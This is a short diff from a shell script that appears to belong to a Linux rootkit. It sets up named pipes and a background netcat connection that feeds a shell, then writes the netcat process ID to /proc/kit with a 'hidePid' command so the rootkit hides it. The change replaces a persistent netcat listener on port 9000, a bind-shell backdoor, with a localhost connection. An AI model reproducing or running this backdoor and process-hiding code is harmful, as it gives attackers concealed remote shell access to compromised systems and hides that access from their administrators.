@@ -12,8 +12,8 @@ localPort=9000
 mkfifo fromBash
 mkfifo toBash
 
-#echo "cd" > toBash
-nc -l -k "$localPort" < fromBash >> toBash &
+
+nc localhost "$localPort" < fromBash >> toBash &
 backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
